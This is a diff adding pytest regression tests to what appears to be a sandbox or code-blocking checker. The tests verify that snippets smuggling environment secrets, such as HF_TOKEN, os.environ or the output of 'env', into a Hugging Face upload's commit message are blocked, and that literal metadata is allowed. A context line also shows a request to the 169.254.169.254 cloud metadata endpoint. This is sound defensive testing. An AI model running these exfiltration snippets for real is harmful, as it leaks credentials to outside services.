@@ -2376,6 +2376,39 @@ class TestR7_NetworkAndIoVisitorModuleRebinding:
 
 class TestCurrentMainConflictRegressions:
     @pytest.mark.parametrize(
+        "env_expr",
+        [
+            "str(o.environ)",
+            "o.getenv('HF_TOKEN')",
+            "str(alias.environ)",
+            "str(sp.check_output(['env']))",
+        ],
+    )
+    def test_hf_upload_environment_aliases_blocked(self, env_expr):
+        alias_setup = ""
+        if env_expr.startswith("str(alias"):
+            alias_setup = "alias = o\n"
+        elif env_expr.startswith("str(sp"):
+            alias_setup = "import subprocess as sp\n"
+        code = (
+            "from huggingface_hub import upload_file\n"
+            "import os as o\n"
+            f"{alias_setup}"
+            "upload_file(path_or_fileobj='safe.txt', path_in_repo='x', "
+            f"repo_id='a/b', commit_message={env_expr})"
+        )
+        assert _is_blocked(code), f"HF upload environment alias leaked: {code!r}"
+
+    def test_hf_upload_literal_metadata_allowed(self):
+        code = (
+            "from huggingface_hub import upload_file\n"
+            "import os as o\n"
+            "upload_file(path_or_fileobj='safe.txt', path_in_repo='x', "
+            "repo_id='a/b', commit_message='safe')"
+        )
+        assert not _is_blocked(code), f"literal HF upload metadata blocked: {code!r}"
+
+    @pytest.mark.parametrize(
         "code",
         [
             "import requests as r\nf = r.get\nf('http://169.254.169.254/')",
